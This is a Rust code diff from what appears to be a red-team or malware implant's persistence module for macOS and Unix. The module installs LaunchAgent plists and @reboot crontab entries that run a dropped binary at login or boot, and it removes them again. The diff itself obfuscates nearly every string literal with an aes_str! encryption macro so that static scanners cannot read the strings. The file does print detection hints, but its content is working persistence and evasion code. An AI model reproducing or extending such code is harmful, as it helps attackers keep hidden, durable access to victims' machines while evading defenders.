@@ -33,7 +33,7 @@ fn launch_agents_dir() -> Result<PathBuf, String> {
 }
 
 fn plist_path(label: &str) -> Result<PathBuf, String> {
-    Ok(launch_agents_dir()?.join(format!("{label}.plist")))
+    Ok(launch_agents_dir()?.join(format!("{}{}", label, aes_str!(".plist"))))
 }
 
 // ── Stable drop location ──────────────────────────────────────────────
@@ -48,7 +48,7 @@ fn stable_drop(source: &str, name: &str) -> Result<String, String> {
         .join(aes_str!("Application Support"))
         .join(name);
     std::fs::create_dir_all(&support_dir)
-        .map_err(|e| format!("mkdir Application Support/{name}: {e}"))?;
+        .map_err(|e| format!("{}{}: {}", aes_str!("mkdir Application Support/"), name, e))?;
 
     let dst = support_dir.join(name);
     let dst_str = dst.to_string_lossy().into_owned();
@@ -61,11 +61,11 @@ fn stable_drop(source: &str, name: &str) -> Result<String, String> {
 
     if !already {
         std::fs::copy(source, &dst)
-            .map_err(|e| format!("stable_drop: {} → {dst_str}: {e}", source))?;
+            .map_err(|e| format!("{}: {} → {}: {}", aes_str!("stable_drop"), source, dst_str, e))?;
 
         use std::os::unix::fs::PermissionsExt;
         std::fs::set_permissions(&dst, std::fs::Permissions::from_mode(0o755))
-            .map_err(|e| format!("chmod {dst_str}: {e}"))?;
+            .map_err(|e| format!("{} {}: {}", aes_str!("chmod"), dst_str, e))?;
     }
 
     Ok(dst_str)
@@ -80,16 +80,21 @@ fn stable_drop(source: &str, name: &str) -> Result<String, String> {
 
 fn build_plist(label: &str, binary_path: &str) -> String {
     format!(
-        r#"<?xml version="1.0" encoding="UTF-8"?>
+        "{}{}{}{}",
+        aes_str!(r#"<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
   "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
 <dict>
     <key>Label</key>
-    <string>{label}</string>
+    <string>"#),
+        label,
+        aes_str!(r#"</string>
     <key>ProgramArguments</key>
     <array>
-        <string>{binary_path}</string>
+        <string>"#),
+        binary_path,
+        aes_str!(r#"</string>
     </array>
     <key>RunAtLoad</key>
     <true/>
@@ -103,7 +108,7 @@ fn build_plist(label: &str, binary_path: &str) -> String {
     <string>/dev/null</string>
 </dict>
 </plist>
-"#
+"#)
     )
 }
 
@@ -116,23 +121,24 @@ pub fn install_launchagent(label: &str, binary_path: &str) -> Result<String, Str
     let path = plist_path(label)?;
 
     fs::create_dir_all(&dir)
-        .map_err(|e| format!("mkdir LaunchAgents: {e}"))?;
+        .map_err(|e| format!("{}: {}", aes_str!("mkdir LaunchAgents"), e))?;
 
     let plist = build_plist(label, &stable);
     fs::write(&path, &plist)
-        .map_err(|e| format!("Write plist: {e}"))?;
+        .map_err(|e| format!("{}: {}", aes_str!("Write plist"), e))?;
 
     use std::os::unix::fs::PermissionsExt;
     fs::set_permissions(&path, fs::Permissions::from_mode(0o600))
-        .map_err(|e| format!("chmod plist: {e}"))?;
+        .map_err(|e| format!("{}: {}", aes_str!("chmod plist"), e))?;
 
     Ok(format!(
-        "[+] LaunchAgent installed\n    Copied:  {} → {stable}\n    Label:   {label}\n    Plist:   {}\n    \
-         Load now: launchctl load {}\n    \
-         Detection: file create in ~/Library/LaunchAgents/, ESF event, Unified Log (launchd)",
-        binary_path,
-        path.display(),
-        path.display()
+        "{}\n    {}  {} → {}\n    {}   {}\n    {}   {}\n    {} {}\n    {}",
+        aes_str!("[+] LaunchAgent installed"),
+        aes_str!("Copied:"), binary_path, stable,
+        aes_str!("Label:"), label,
+        aes_str!("Plist:"), path.display(),
+        aes_str!("Load now: launchctl load"), path.display(),
+        aes_str!("Detection: file create in ~/Library/LaunchAgents/, ESF event, Unified Log (launchd)")
     ))
 }
 
@@ -140,7 +146,7 @@ pub fn remove_launchagent(label: &str) -> Result<String, String> {
     let path = plist_path(label)?;
 
     if !path.exists() {
-        return Ok(format!("[~] No LaunchAgent plist found for label: {label}"));
+        return Ok(format!("{}: {}", aes_str!("[~] No LaunchAgent plist found for label"), label));
     }
 
     // Unload first (best-effort - ignore error if not loaded)
@@ -149,9 +155,9 @@ pub fn remove_launchagent(label: &str) -> Result<String, String> {
         .output();
 
     fs::remove_file(&path)
-        .map_err(|e| format!("Remove plist: {e}"))?;
+        .map_err(|e| format!("{}: {}", aes_str!("Remove plist"), e))?;
 
-    Ok(format!("[+] LaunchAgent '{label}' removed"))
+    Ok(format!("{} '{}' {}", aes_str!("[+] LaunchAgent"), label, aes_str!("removed")))
 }
 
 // ── T1053.003 - Crontab ───────────────────────────────────────────────
@@ -164,47 +170,49 @@ pub fn install_cron(binary_path: &str) -> Result<String, String> {
     let stable = stable_drop(binary_path, &name)?;
 
     let current = Command::new(aes_str!("crontab"))
-        .arg("-l")
+        .arg(aes_str!("-l"))
         .output()
-        .map_err(|e| format!("crontab -l: {e}"))?;
+        .map_err(|e| format!("{}: {}", aes_str!("crontab -l"), e))?;
 
     let existing = String::from_utf8_lossy(&current.stdout);
 
     if existing.contains(&stable) {
-        return Ok(format!("[~] Cron entry already present for: {stable}"));
+        return Ok(format!("{}: {}", aes_str!("[~] Cron entry already present for"), stable));
     }
 
     let new_content = if existing.trim().is_empty() {
-        format!("@reboot {stable}\n")
+        format!("{} {}\n", aes_str!("@reboot"), stable)
     } else {
-        format!("{}\n@reboot {stable}\n", existing.trim_end_matches('\n'))
+        format!("{}\n{} {}\n", existing.trim_end_matches('\n'), aes_str!("@reboot"), stable)
     };
 
-    let tmp = format!("/tmp/.cron_{}", std::process::id());
-    fs::write(&tmp, &new_content).map_err(|e| format!("Write temp crontab: {e}"))?;
+    let tmp = format!("{}{}", aes_str!("/tmp/.cron_"), std::process::id());
+    fs::write(&tmp, &new_content).map_err(|e| format!("{}: {}", aes_str!("Write temp crontab"), e))?;
 
     let rc = Command::new(aes_str!("crontab"))
         .arg(&tmp)
         .status()
-        .map_err(|e| format!("crontab <tmp>: {e}"))?;
+        .map_err(|e| format!("{}: {}", aes_str!("crontab <tmp>"), e))?;
     let _ = fs::remove_file(&tmp);
 
     if !rc.success() {
-        return Err(format!("crontab install exited {}", rc.code().unwrap_or(-1)));
+        return Err(format!("{} {}", aes_str!("crontab install exited"), rc.code().unwrap_or(-1)));
     }
 
     Ok(format!(
-        "[+] Cron persistence installed\n    Copied: {} → {stable}\n    Entry:  @reboot {stable}\n    \
-         Detection: /usr/lib/cron/tabs/<user> write, auditd path=/var/spool/cron/crontabs",
-        binary_path
+        "{}\n    {} {} → {}\n    {}  {} {}\n    {}",
+        aes_str!("[+] Cron persistence installed"),
+        aes_str!("Copied:"), binary_path, stable,
+        aes_str!("Entry:"), aes_str!("@reboot"), stable,
+        aes_str!("Detection: /usr/lib/cron/tabs/<user> write, auditd path=/var/spool/cron/crontabs")
     ))
 }
 
 pub fn remove_cron(binary_path: &str) -> Result<String, String> {
     let current = Command::new(aes_str!("crontab"))
-        .arg("-l")
+        .arg(aes_str!("-l"))
         .output()
-        .map_err(|e| format!("crontab -l: {e}"))?;
+        .map_err(|e| format!("{}: {}", aes_str!("crontab -l"), e))?;
 
     let existing = String::from_utf8_lossy(&current.stdout);
     let filtered: String = existing
@@ -214,22 +222,22 @@ pub fn remove_cron(binary_path: &str) -> Result<String, String> {
         .collect();
 
     if filtered == existing.to_string() {
-        return Ok(format!("[~] No cron entry found for: {binary_path}"));
+        return Ok(format!("{}: {}", aes_str!("[~] No cron entry found for"), binary_path));
     }
 
-    let tmp = format!("/tmp/.cron_{}", std::process::id());
-    fs::write(&tmp, &filtered).map_err(|e| format!("Write temp crontab: {e}"))?;
+    let tmp = format!("{}{}", aes_str!("/tmp/.cron_"), std::process::id());
+    fs::write(&tmp, &filtered).map_err(|e| format!("{}: {}", aes_str!("Write temp crontab"), e))?;
 
     let rc = Command::new(aes_str!("crontab"))
         .arg(&tmp)
         .status()
-        .map_err(|e| format!("crontab reload: {e}"))?;
+        .map_err(|e| format!("{}: {}", aes_str!("crontab reload"), e))?;
     let _ = fs::remove_file(&tmp);
 
     if rc.success() {
-        Ok(format!("[+] Removed cron entry for: {binary_path}"))
+        Ok(format!("{}: {}", aes_str!("[+] Removed cron entry for"), binary_path))
     } else {
-        Err(format!("crontab reload exited {}", rc.code().unwrap_or(-1)))
+        Err(format!("{} {}", aes_str!("crontab reload exited"), rc.code().unwrap_or(-1)))
     }
 }
 
@@ -239,26 +247,26 @@ pub fn list() -> String {
     let mut out = Vec::new();
 
     // LaunchAgents
-    out.push("=== LaunchAgents (~/Library/LaunchAgents/) ===".to_string());
+    out.push(aes_str!("=== LaunchAgents (~/Library/LaunchAgents/) ==="));
     match launch_agents_dir().and_then(|d| fs::read_dir(&d).map_err(|e| e.to_string())) {
         Ok(entries) => {
             let plists: Vec<_> = entries
                 .flatten()
-                .filter(|e| e.path().extension().map(|x| x == "plist").unwrap_or(false))
+                .filter(|e| e.path().extension().map(|x| x == aes_str!("plist").as_str()).unwrap_or(false))
                 .map(|e| format!("  {}", e.file_name().to_string_lossy()))
                 .collect();
             if plists.is_empty() {
-                out.push("  (none)".into());
+                out.push(aes_str!("  (none)"));
             } else {
                 out.extend(plists);
             }
         }
-        Err(e) => out.push(format!("  Error: {e}")),
+        Err(e) => out.push(format!("  {}: {}", aes_str!("Error"), e)),
     }
 
     // Crontab
-    out.push("\n=== Crontab ===".to_string());
-    match Command::new(aes_str!("crontab")).arg("-l").output() {
+    out.push(aes_str!("\n=== Crontab ==="));
+    match Command::new(aes_str!("crontab")).arg(aes_str!("-l")).output() {
         Ok(o) if o.status.success() => {
             let text = String::from_utf8_lossy(&o.stdout);
             let entries: Vec<_> = text
@@ -266,12 +274,12 @@ pub fn list() -> String {
                 .filter(|l| !l.trim_start().starts_with('#') && !l.trim().is_empty())
                 .collect();
             if entries.is_empty() {
-                out.push("  (empty)".into());
+                out.push(aes_str!("  (empty)"));
             } else {
                 out.extend(entries.iter().map(|l| format!("  {l}")));
             }
         }
-        _ => out.push("  (no crontab)".into()),
+        _ => out.push(aes_str!("  (no crontab)")),
     }
 
     out.join("\n")
